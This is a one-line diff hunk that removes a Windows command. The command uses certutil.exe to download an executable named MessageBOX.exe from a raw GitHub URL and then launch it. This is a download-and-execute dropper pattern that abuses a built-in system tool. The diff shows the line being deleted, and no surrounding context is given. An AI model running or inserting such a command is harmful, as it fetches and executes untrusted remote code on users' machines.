@@ -1,1 +1,0 @@
-certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/master/MessageBOX.exe" MessageBOX.exe && start "" MessageBOX.exe
